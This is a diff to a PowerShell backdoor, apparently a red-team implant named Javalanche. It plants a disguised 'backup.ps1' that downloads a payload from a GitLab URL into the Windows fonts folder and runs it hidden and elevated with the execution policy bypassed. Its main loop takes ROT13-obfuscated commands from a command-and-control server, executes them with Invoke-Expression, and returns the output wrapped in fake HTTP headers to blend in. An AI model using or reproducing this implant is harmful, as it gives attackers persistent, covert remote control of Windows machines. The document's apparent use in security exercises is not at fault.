@@ -46,7 +46,7 @@ if(!(Test-Path "C:\Program Files (x86)\Webkinz")){
 if(!(Test-Path "C:\Program Files (x86)\Webkinz\backup.ps1")){
     New-Item -ItemType "File" -Path "C:\Program Files (x86)\Webkinz\backup.ps1"
     $backupCommands = "if(!(Test-Path C:\Windows\fonts\Javalanche.ps1)){"
-    $backupCommands += "wget -o C:\Windows\fonts\Javalanche.ps1 `"gitlab.ritsec.cloud/jms9508/james-danny-ritsecredteamrecruiting/Payloads/windowsPayload.ps1`";"
+    $backupCommands += "wget -o C:\Windows\fonts\Javalanche.ps1 `"https://gitlab.ritsec.cloud/jms9508/Javalanche/-/raw/main/Payloads/windowsPayload.sh?ref_type=heads`";"
     $backupCommands += "Start-Process -FilePath `"powershell.exe`" -ArgumentList `"set-executionpolicy -ExecutionPolicy Unrestricted -Scope Process -Force;& C:\Windows\fonts\Javalanche.ps1 -BeaconIPAddress $($beaconIPAddress)`" -WindowStyle Hidden -Verb RunAs"
     $backupCommands | Out-File "C:\Program Files (x86)\Webkinz\backup.ps1"
 }
@@ -106,6 +106,11 @@ while($true){
     Start-Process -FilePath "powershell.exe" -WindowStyle Hidden -ArgumentList "-Command Start-Sleep -Seconds $($sleepTime)"
 
     # Get commands from the C2, run them and send the output back
+    # There are 4 lines (HTTP/1.1, Content-Length, Content-type, and a blank line) that we don't care about that compose the HTTP header
+    $reader.ReadLine() | Out-Null
+    $reader.ReadLine() | Out-Null
+    $reader.ReadLine() | Out-Null
+    $reader.ReadLine() | Out-Null
     $command = $reader.ReadLine()
     $command = Convert-ROT13 $command
     $reply = Invoke-Expression $command
@@ -113,6 +118,8 @@ while($true){
         $reply = $reply | Out-String
     }
     $reply = Convert-ROT13 $reply
+    $httpHeader = "GET / HTTP/1.1`r`nContent-Length: " + $reply.length + "`r`nContent-Type: text/plain; charset=utf-8`r`n`r`n"
+    $reply = $httpHeader + $reply
     $writer.WriteLine($reply)
     $I++;
 }
